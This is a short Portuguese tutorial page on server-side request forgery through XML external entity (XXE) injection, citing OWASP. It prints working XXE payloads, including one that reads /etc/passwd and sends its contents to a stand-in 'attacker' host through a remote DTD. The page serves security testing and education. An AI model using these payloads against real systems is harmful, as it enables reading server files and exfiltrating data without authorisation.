---
title: Falsificação de solicitação do lado do servidor
---

`Server Side Request Forgery (SSRF)` ocorre quando o servidor recebe um esquema `XML malicioso`, que faz com que o servidor recupere recursos remotos, como um arquivo, um arquivo via `HTTP/HTTPS/FTP`, etc. `SSRF` foi usado para recuperar arquivos remotos, para provar um `XXE` quando você não pode refletir de volta o arquivo ou executar varredura de portas ou executar ataques de força bruta em redes internas.

### Resolução de DNS externo

Às vezes, é possível induzir o aplicativo a realizar pesquisas `DNS` do lado do servidor de nomes de domínio arbitrários. Esta é uma das formas mais simples de `SSRF`, mas requer que o invasor analise o tráfego `DNS`. O Burp tem um plugin que verifica esse ataque.

```xml

<!DOCTYPE m PUBLIC "-//B/A/EN" "http://checkforthisspecificdomain.example.com">

```

### Conexão externa

Sempre que houver um `XXE` e você não puder recuperar um arquivo, teste se conseguirá estabelecer conexões remotas:

```xml 

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
 <!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">
 %xxe;
]>
```

### Recuperação de arquivo com entidades de parâmetro

As entidades de parâmetro permitem a recuperação de conteúdo usando referências de URL. Considere o seguinte documento XML malicioso:

```xml 
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % dtd SYSTEM "http://attacker/evil.dtd">
 %dtd;
]>
<root>&send;</root>

```

Aqui, o DTD define duas entidades de parâmetro externo: `file` carrega um arquivo local e `dtd` que carrega um `DTD remoto`. O `DTD` remoto deve conter algo assim:

```xml

<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % all "<!ENTITY send SYSTEM 'http://example.com/?%file;'>">
%all;

```

O segundo `DTD` faz com que o sistema envie o conteúdo de `file` volta para o servidor do invasor como um parâmetro do URL.

## Referência externa

- [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html)